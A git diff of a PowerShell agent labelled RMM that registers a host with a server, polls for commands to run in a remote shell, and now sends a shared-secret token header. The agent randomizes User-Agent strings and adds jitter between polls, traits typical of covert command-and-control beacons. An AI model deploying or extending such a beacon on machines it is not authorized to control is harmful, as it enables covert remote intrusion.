@@ -20,6 +20,25 @@ $sessionId = [System.Guid]::NewGuid().ToString()
 $computerName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 
+# Shared secret for beacon endpoints (must match server RMM_BEACON_SECRET).
+$beaconSecret = $null
+if ($env:RMM_BEACON_SECRET -and $env:RMM_BEACON_SECRET.Trim().Length -gt 0) {
+    $beaconSecret = $env:RMM_BEACON_SECRET.Trim()
+}
+
+function Get-RmmRequestHeaders {
+    param([string]$UserAgent = (Get-RandomUserAgent))
+    $h = @{
+        "User-Agent" = $UserAgent
+        "Accept" = "*/*"
+        "Cache-Control" = "no-cache"
+    }
+    if ($beaconSecret) {
+        $h["X-RMM-Beacon-Token"] = $beaconSecret
+    }
+    return $h
+}
+
 # Remote shell CWD (in memory only; each cmd/pwsh run is otherwise stateless).
 $script:RmmShellCwd = (Get-Location).Path
 
@@ -556,11 +575,7 @@ if ($script:UsePersistentHttp) {
 while (-not $registered -and $retryCount -lt $maxRetries) {
     try {
         $registerUrl = "$u/register?id=$sessionId&h=$computerName&u=$userName"
-        $headers = @{
-            "User-Agent" = Get-RandomUserAgent
-            "Accept" = "*/*"
-            "Cache-Control" = "no-cache"
-        }
+        $headers = Get-RmmRequestHeaders
         
         $response = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
         Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
@@ -594,13 +609,8 @@ while ($true) {
         # Add jitter before each poll cycle
         $actualSleep = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
         
-        # Randomized headers for each request
-        $headers = @{
-            "User-Agent" = Get-RandomUserAgent
-            "Accept" = "*/*"
-            "Cache-Control" = "no-cache"
-            "X-Request-ID" = [System.Guid]::NewGuid().ToString()
-        }
+        $headers = Get-RmmRequestHeaders
+        $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
         
         # Get command from RMM
         $cmdUrl = "$u/cmd?id=$sessionId"
